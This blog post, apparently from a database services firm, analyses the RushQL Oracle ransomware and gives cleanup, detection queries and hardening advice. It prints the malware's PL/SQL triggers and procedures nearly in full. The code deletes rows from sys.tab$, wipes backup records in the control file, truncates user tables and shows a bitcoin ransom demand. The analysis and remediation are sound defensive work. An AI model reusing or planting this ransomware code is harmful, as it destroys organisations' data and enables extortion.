---
layout:     post
title:      Oracle数据库勒索病毒RushQL分析及处理
subtitle:   Oracle数据库勒索病毒卷土重来
date:       2019-01-20
author:     李德鹏
header-img: img/post-bg-halting.jpg
catalog: true
tags:
    - rushql
    - oracle
    - 勒索病毒
    - IT服务
    - 运维
---
> 转自[李德鹏blog](https://me.csdn.net/cc_dba)

# 比特币勒索攻击卷土重来

臭名昭著的比特币勒索攻击卷土重来。近期，有客户在巡检Oracle数据库时出现如下勒索警告信息：
![](http://img.yuandingit.com/15479758537800.png)

元鼎科技数据库团队紧急介入后，帮助用户清除病毒，并及时恢复业务挽回损失。为避免更多企业用户受到类似攻击，将处理、分析过程以及预防策略进行总结，用户可及时对自己的数据库环境开展安全自查，并采用有效手段防御类似攻击。

新年第一个周末，用户打电话，可能中了勒索病毒，楞了一下，赶紧安排DBA现场介入，进行处理。Oracle数据库比特币勒索病毒的危害之处有两个，第一是数据库会导致系统表数据被删除（数据库重启后触发），第二是统计信息更新时间如果处于1200天之前，业务数据表会被truncate，导致业务数据丢失。从病毒植入代码角度分段分析可能对系统造成的影响以及处理方式。

# 触发条件1-数据库启动（重启）
数据库重启后，会执行DBMS_SUPPORT_INTERNAL触发器，触发存储过程关键操作有两个：
* 备份sys.tab$表，并删除非sys，（owner#=38）用户的表信息，导致业务对象无法访问。
* 清除控制文件中的备份信息（包含归档、备份集、备份片、备份数据文件），让DBA误认为备份信息不可用。

触发器代码：DBMS_SUPPORT_INTERNAL
```

create or replace trigger "DBMS_SUPPORT_INTERNAL "
after startup on database 
begin
"DBMS_SUPPORT_INTERNAL ";

```
存储过程DBMS_SUPPORT_INTERNAL，根据创建数据库时间和当前时间差值做决定，是立刻入侵并实施勒索，还是潜伏直到条件成熟再进行勒索。

```
PROCEDURE "DBMS_SUPPORT_INTERNAL " IS 
DATE1 INT :=10;
E1 EXCEPTION;
PRAGMA EXCEPTION_INIT(E1, -20312);
BEGIN
SELECT NVL(TO_CHAR(SYSDATE-CREATED ),0) INTO DATE1 FROM V$DATABASE;
IF (DATE1>=1200) THEN
EXECUTE IMMEDIATE 'create table ORACHK'||SUBSTR(SYS_GUID,10)||' tablespace system as select * from sys.tab$';
DELETE SYS.TAB$ WHERE DATAOBJ# IN (SELECT DATAOBJ# FROM SYS.OBJ$ WHERE OWNER# NOT IN (0,38)) ;
COMMIT;
EXECUTE IMMEDIATE 'alter system checkpoint';
SYS.DBMS_BACKUP_RESTORE.RESETCFILESECTION(11);
SYS.DBMS_BACKUP_RESTORE.RESETCFILESECTION(12);
SYS.DBMS_BACKUP_RESTORE.RESETCFILESECTION(13);
SYS.DBMS_BACKUP_RESTORE.RESETCFILESECTION(14);
FOR I IN 1..2046 LOOP
DBMS_SYSTEM.KSDWRT(2, 'Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive), after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.');
DBMS_SYSTEM.KSDWRT(2, '你的数据库已被SQL RUSH Team锁死 发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致) 之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库');
END LOOP;
RAISE E1;
END IF;
EXCEPTION
WHEN E1 THEN
RAISE_APPLICATION_ERROR(-20312,'你的数据库已被SQL RUSH Team锁死 发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致) 之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库 Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive), after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.');
WHEN OTHERS THEN
NULL;
END;
/

```
解决方案：
1. 删除触发器及存储过程，3个触发器，4个存储过程。
2. 查找`ORACHK'||SUBSTR(SYS_GUID,10)||'`备份表，将数据进行还原即可恢复业务。

```
DROP PROCEDURE "DBMS_SYSTEM_INTERNAL";
DROP PROCEDURE "DBMS_CORE_INTERNAL";
DROP PROCEDURE "DBMS_SUPPORT_INTERNAL";
DROP PROCEDURE "DBMS_STANDARD_FUN9";
ALTER TRIGGER "DBMS_SUPPORT_INTERNAL" DISABLE;
ALTER TRIGGER "DBMS_SYSTEM_INTERNAL" DISABLE;
ALTER TRIGGER "DBMS_CORE_INTERNAL" DISABLE;

```

# 触发条件2-数据库登陆
数据库登陆后，会执行DBMS_SYSTEM_INTERNAL或DBMS_CORE_INTERNAL触发器，分别触发DBMS_SYSTEM_INTERNAL或DBMS_CORE_INTERNAL存储过程。
DBMS_SYSTEM_INTERNAL触发器，和存储过程代码如下：
```
CREATE OR REPLACE TRIGGER "DBMS_CORE_INTERNAL "
AFTER LOGON ON SCHEMA
BEGIN 
"DBMS_CORE_INTERNAL ";
END;
/
```

DBMS_SYSTEM_INTERNAL仅弹窗勒索，未发现有破坏数据库的动作：
```
PROCEDURE "DBMS_SYSTEM_INTERNAL " IS
DATE1 INT :=10;
E1 EXCEPTION;
PRAGMA EXCEPTION_INIT(E1, -20313);
BEGIN
SELECT NVL(TO_CHAR(SYSDATE-MIN(LAST_ANALYZED)),0) INTO DATE1 FROM ALL_TABLES WHERE TABLESPACE_NAME NOT IN ('SYSTEM','SYSAUX','EXAMPLE');
IF (DATE1>=1200) THEN
IF (UPPER(SYS_CONTEXT('USERENV', 'MODULE'))!='C89239.EXE')
THEN
RAISE E1;
END IF;
END IF;
EXCEPTION
WHEN E1 THEN
RAISE_APPLICATION_ERROR(-20313,'你的数据库已被SQL RUSH Team锁死 发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致) 之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库 Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive), after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.');
WHEN OTHERS THEN
NULL;
END;
/
```
DBMS_CORE_INTERNAL，和DBMS_CORE_INTERNAL存储过程代码如下：

```
CREATE OR REPLACE TRIGGER "DBMS_CORE_INTERNAL "
AFTER LOGON ON SCHEMA
BEGIN 
"DBMS_CORE_INTERNAL ";
END;
/

```
DBMS_CORE_INTERNAL根据表空间中表的最小统计信息收集时间和当前时间比决定，是入侵数据库实施勒索，还是先潜伏直到条件成熟再进行勒索。满足条件即执行truncate表操作，清掉用户数据，最后向用户弹窗实施勒索：
```
PROCEDURE "DBMS_CORE_INTERNAL " IS
V_JOB NUMBER;
DATE1 INT :=10;
STAT VARCHAR2(2000);
V_MODULE VARCHAR2(2000);
E1 EXCEPTION;
PRAGMA EXCEPTION_INIT(E1, -20315);
CURSOR TLIST IS SELECT * FROM USER_TABLES WHERE TABLE_NAME NOT LIKE '%$%' AND TABLE_NAME NOT LIKE '%ORACHK%' AND CLUSTER_NAME IS NULL;
BEGIN
SELECT NVL(TO_CHAR(SYSDATE-MIN(LAST_ANALYZED)),0) INTO DATE1 FROM ALL_TABLES WHERE TABLESPACE_NAME NOT IN ('SYSTEM','SYSAUX','EXAMPLE');
IF (DATE1>=1200) THEN
FOR I IN TLIST LOOP
DBMS_OUTPUT.PUT_LINE('table_name is ' ||I.TABLE_NAME);
STAT:='truncate table '||USER||'.'||I.TABLE_NAME;
DBMS_JOB.SUBMIT(V_JOB, 'DBMS_STANDARD_FUN9(''' || STAT || ''');', SYSDATE);
COMMIT;
END LOOP;
END IF; 
IF (UPPER(SYS_CONTEXT('USERENV', 'MODULE'))!='C89239.EXE')
THEN
RAISE E1;
END IF;
EXCEPTION
WHEN E1 THEN
RAISE_APPLICATION_ERROR(-20315,'你的数据库已被SQL RUSH Team锁死 发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致) 之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库 Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive), after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.');
WHEN OTHERS THEN
RAISE_APPLICATION_ERROR(-20315,'你的数据库已被SQL RUSH Team锁死 发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致) 之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库 Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive), after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.'); 
END;
/
```
解决方案：
1. 删除触发器及存储过程，3个触发器，4个存储过程；
2. 有备份情况，重新注册备份集，还原数据库即可。
3. 无备份的话，如果数据没有被新数据覆盖，可以采用DUL工具针对truncate对象进行数据恢复，存在数据丢失风险。

# 确认病毒源
确认病毒植入时间

```
select owner,object_name,CREATED 
    from dba_objects 
where object_name like 'DBMS_%_INTERNAL%' 
    order by created desc;

```
![](http://img.yuandingit.com/15479765325357.png)
根据病毒植入时间，查找监听日志，找出前后5S采用PL/SQL登录的机器。可以确定2018-11-30 11:42:45登录主机和IP为病毒源头

找到目标机器，清理中毒程序
![](http://img.yuandingit.com/15479804629894.png)

# 总结

风险原因
1. 软件管理体系不完善，使用盗版软件，随意安装来源不明的破解、绿色软件。
2. 数据库缺乏网络安全控制，没有严格进行区域隔离，没有堡垒机等安全措施。
3. 数据库权限控制缺失，业务用户具有DBA权限、Drop Any权限，开发能够访问生产库等导致安全风险系数增加。

改进建议
1. 数据库访问权限回收，杜绝DBA权限远程登录，遵循最小化授权原则，禁止无关人员访问数据库。
2. 加强信息安全管理，通过堡垒机访问服务器或数据库
3. 制定安全规范，禁止下载来源不明的程序连接数据库或服务器。
4. 定期巡检，数据库安全健康检查。
5. 做好数据库容灾和备份管理工作。（Dataguard并不能预防此类风险）

勒索病毒检查方法

执行如下语句，如果发现有匹配的触发器和存储过程，证明已中毒，请尽快按照文中方式进行清理。

```
select owner,TRIGGER_NAME obj_name 
        from dba_triggers 
    where TRIGGER_NAME like 'DBMS_%_INTERNAL%'
union all
select owner,object_name obj_name 
        from dba_procedures 
    where object_name like 'DBMS_%_INTERNAL% ';

```